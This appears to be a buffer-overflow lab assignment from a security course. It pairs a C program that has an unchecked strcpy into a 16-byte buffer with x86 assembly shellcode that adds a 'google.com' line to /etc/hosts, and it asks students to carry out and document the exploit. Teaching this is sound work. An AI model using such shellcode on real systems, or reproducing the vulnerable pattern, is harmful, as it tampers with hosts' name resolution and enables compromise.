# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
```c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in asm. This shellcode add a new entry in hosts file
```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is  added to the /etc/hosts file on your linux. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

Description text (optional)


``` 
    code block (optional)
```

output screenshot (optional)

**Conclusion**: comment text about the screenshot or simply answered text for the question
